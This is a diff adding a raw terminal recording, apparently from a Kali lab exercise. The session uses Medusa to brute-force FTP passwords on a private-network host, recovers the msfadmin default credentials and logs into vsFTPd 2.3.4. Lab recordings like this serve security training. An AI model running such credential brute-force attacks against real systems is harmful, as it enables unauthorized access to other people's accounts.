@@ -1,0 +1,53 @@
+Script started on 2026-04-19 12:13:28-04:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="195" LINES="46"]
+                                                                                                                                                                                                   
+
+]0;kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hping 10.0.2.15[8D92.168.56.101[19Dip a               [15D[36mi[36mp[39m [1ma[0m[36mp[36mi[39mn[1mg[0m 192.168.56.101[19D[36mp[36mi[36mn[0m[36mg[39m[15C[19D[36mi[36mp[36m [36ma[39m               [15D[36mi[36mp[39m[39m [39m[1ma[0m[36mp[36mi[39mn[1mg[0m 10.0.2.15[14D[36mp[36mi[36mn[0m[36mg[39m[10C[9D-c 3 10.0.2.1524[16D[32m-[32mc[39m[14C[16D[32m1[32m0[39m.0.2.15       [9D[39m1[39m0[7C[14D[36mi[36mp[36m [36ma[39m          [10D[36mi[36mp[39m[39m [39m[1ma[0m[36mp[36mi[39mn[1mg[0m 192.168.56.101[19D[36mp[36mi[36mn[0m[36mg[39m[15C[13D0.0.2.15     [14D[39m [39m [39m [39m           [14Dping 10.0.2.15[14D[36mp[36mi[36mn[36mg[39m[10C[8D92.168.56.101[13D0.0.2.15     [14D[39m [39m [39m [39m           [14Dm[4mm[24m[4mm[4me[24m[4mm[4me[4md[24m[4md[4mu[24m[4mu[4ms[24m[4ms[4ma[24m[24m[36mm[24m[36me[24m[36md[24m[36mu[24m[36ms[24m[36ma[39m[36ma[36m [39m[36ma[39m[39m -[32m-[39m[32m-[32mh[39m[32mh[32m [39m[32mh[39m[39m 192.168.56.102 -[32m-[39m[32m-[32mU[39m[32mU[32m [39m[32mU[39m[39m u[1mu[0m[1mu[1ms[0m[1ms[1me[0m[1me[1mr[0m[1mr[1ms[0m[1ms[1m.[0m[1m.[1mt[0m[1mt[1mx[0m[1mx[1mt[0m[1mt[1m [0m[1mt[0m[0m -[32m-[39m[32m-[32mP[39m[32mP[32m [39m[32mP[39m[39m p[1mp[0m[1mp[1ma[0m[1ma[1ms[0m[1ms[1ms[0m[1ms[1m.[0m[1m.[1mt[0m[1mt[1mx[0m[1mx[1mt[0m[1mt[1m [0m[1mt[0m[0m -[32m-[39m[32m-[32mM[39m[32mM[32m [39m[32mM[39m[39m ftp -[32m-[39m[32m-[32mt[39m[32mt[32m [39m[32mt[39m[39m 6[?1l>[?2004l
+
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2026-04-19 12:14:55 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (1 of 4 complete)
+2026-04-19 12:14:55 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 123456 (1 of 4 complete)
+2026-04-19 12:14:55 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: password (2 of 4 complete)
+2026-04-19 12:14:55 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (3 of 4 complete)
+2026-04-19 12:14:55 ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
+2026-04-19 12:14:56 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: password (2 of 4 complete)
+2026-04-19 12:14:56 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: 123456 (3 of 4 complete)
+2026-04-19 12:14:56 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: qwerty (4 of 4 complete)
+2026-04-19 12:14:58 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: 123456 (1 of 4 complete)
+2026-04-19 12:14:58 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: qwerty (4 of 4 complete)
+2026-04-19 12:14:58 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: password (2 of 4 complete)
+2026-04-19 12:14:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: msfadmin (3 of 4 complete)
+2026-04-19 12:15:00 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: qwerty (4 of 4 complete)
+2026-04-19 12:15:00 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: 123456 (1 of 4 complete)
+2026-04-19 12:15:01 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (2 of 4 complete)
+2026-04-19 12:15:01 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (3 of 4 complete)
+2026-04-19 12:15:01 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: qwerty (4 of 4 complete)
+                                                                                                                                                                                                   
+
+]0;kali@kali: ~
+
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hf[4mf[24m[4mf[4mt[24m[4mf[4mt[4mp[24m[24m[36mf[24m[36mt[24m[36mp[39m[36mp[36m [39m[36mp[39m[39m 192.168.56.102[?1l>[?2004l
+
+Connected to 192.168.56.102.
+220 (vsFTPd 2.3.4)
+Name (192.168.56.102:kali): msfadmin
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> quit
+421 Timeout.
+                                                                                                                                                                                                   
+
+]0;kali@kali: ~
+
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004he[4me[24m[4me[24m[38;5;244mxit[39m[4me[39m[4mx[24m[24m[36me[24m[36mx[39m[36me[36mx[36mi[39m[39m[4me[39m[4mx[39m[4mi[24m[4mi[39m[4mt[24m[24m[36me[24m[36mx[24m[36mi[24m[36mt[39m[?1l>[?2004l
+
+
+Script done on 2026-04-19 12:24:14-04:00 [COMMAND_EXIT_CODE="0"]
+
